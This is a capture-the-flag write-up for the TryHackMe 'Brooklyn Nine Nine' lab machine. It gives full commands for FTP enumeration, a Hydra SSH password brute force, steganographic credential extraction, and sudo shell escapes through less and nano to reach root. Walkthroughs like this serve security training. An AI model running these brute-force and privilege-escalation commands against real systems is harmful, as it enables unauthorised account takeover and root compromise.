---
title: "Brooklyn Nine Nine"
description: "A beginner-friendly CTF room with two exploitation paths — FTP enumeration leading to SSH brute force, and image steganography revealing credentials — both resulting in root access."
difficulty: "Easy"
tags: ["FTP", "Steganography", "Brute Force", "Privilege Escalation", "GTFOBins"]
date: "2026-07-04"
---

## Overview

Brooklyn Nine Nine is a TryHackMe boot2root machine themed around the TV show. It offers two independent paths to compromise the target — one through SSH brute forcing and another through image steganography. Both paths require basic enumeration and use GTFOBins for privilege escalation.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** FTP enumeration, steganography (steghide/stegseek), SSH brute forcing (Hydra), privilege escalation via sudo misconfigurations

## Enumeration

### Nmap Scan

Started with an nmap scan to discover open ports and services:

```bash
nmap -sV -sC -oN nmap.txt 10.48.150.210
```

Three open ports were identified:

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 7.6p1 |
| 80/tcp | HTTP | Apache 2.4.29 |

### Anonymous FTP Access

Connected to the FTP server with anonymous credentials:

```bash
ftp 10.48.150.210
# username: anonymous
# password: (blank)
```

Inside, a single file was present:

```
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

### note_to_jake.txt

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

This hint confirms that user `jake` has a weak password and that SSH brute forcing is a viable path. It also hints that there may be a second approach involving user `holt`.

### Web Server on Port 80

Visiting the website displayed a single image of the Brooklyn Nine Nine cast (`brooklyn99.jpg`). Viewing the page source confirmed it was the only content. This image is the entry point for the second exploitation path.

## Path 1 — Jake (SSH Brute Force)

### Brute Forcing SSH with Hydra

Using the hint from the note, brute-forced SSH for user `jake` with the `rockyou.txt` wordlist:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.48.150.210 ssh
```

Hydra quickly found the password and returned the credentials.

### SSH as Jake

Logged in via SSH:

```bash
ssh jake@10.48.150.210
```

### User Flag

```bash
jake@brookly_nine_nine:~$ cat user.txt
```

### Privilege Escalation

Checked sudo permissions:

```bash
jake@brookly_nine_nine:~$ sudo -l
```

Output showed that `jake` could run `/usr/bin/less` as root without a password:

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Used GTFOBins to break out of `less` into a root shell:

```bash
sudo less /etc/profile
```

Inside `less`, typed `!/bin/sh` to spawn a root shell.

### Root Flag

```bash
cat /root/root.txt
```

## Path 2 — Holt (Steganography)

### Extracting Hidden Data from the Image

Downloaded the image from the web server:

```bash
wget http://10.48.150.210/brooklyn99.jpg
```

Used `steghide` to check for embedded data. When prompted for a passphrase, leaving it blank extracted the hidden file:

```bash
steghide extract -sf brooklyn99.jpg
# Enter passphrase: (blank/Enter)
```

Alternatively, `stegseek` can automate passphrase cracking with `rockyou.txt`:

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

Both methods extract a file named `note.txt`:

```
Holts Password:
<password>

Enjoy!!
```

### SSH as Holt

```bash
ssh holt@10.48.150.210
# password: <extracted password>
```

### User Flag

```bash
holt@brookly_nine_nine:~$ cat user.txt
```

### Privilege Escalation

Checked sudo permissions:

```bash
holt@brookly_nine_nine:~$ sudo -l
```

Output showed that `holt` could run `/bin/nano` as root without a password:

```
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

Used GTFOBins to escape `nano` into a root shell:

```bash
sudo nano
```

Inside nano:
1. Press `Ctrl+R` (Read File)
2. Press `Ctrl+X` (Execute Command)
3. Type: `reset; sh 1>&0 2>&0`
4. Press Enter

This spawned an interactive root shell.

### Root Flag

```bash
cat /root/root.txt
```

## Flags

| Flag | Location |
|------|----------|
| User | `/home/jake/user.txt` or `/home/holt/user.txt` |
| Root | `/root/root.txt` |

## Commands Used

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
ftp <target-ip>
hydra -l jake -P /usr/share/wordlists/rockyou.txt <target-ip> ssh
wget http://<target-ip>/brooklyn99.jpg
steghide extract -sf brooklyn99.jpg
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
ssh jake@<target-ip>
ssh holt@<target-ip>
sudo less /etc/profile    # then !/bin/sh
sudo nano                 # then Ctrl+R, Ctrl+X, "reset; sh 1>&0 2>&0"
```

## Lessons Learned

- **Anonymous FTP** should never expose sensitive files. The note left for Jake gave away critical information that enabled the attack.
- **Steganography** is a common CTF technique for hiding credentials in plain sight. Always check images for embedded data using tools like `steghide` or `stegseek`.
- **Weak passwords** remain one of the most common vulnerabilities. Jake's password was cracked within seconds using a standard wordlist.
- **Sudo misconfigurations** are a frequent privilege escalation vector. Always run `sudo -l` immediately after gaining initial access.
- **GTFOBins** is an essential resource for identifying how to abuse legitimate binaries for privilege escalation.

## References

- [TryHackMe — Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)
- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
- [GTFOBins — nano](https://gtfobins.github.io/gtfobins/nano/)
- [Stegseek](https://github.com/RickdeJager/StegSeek)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
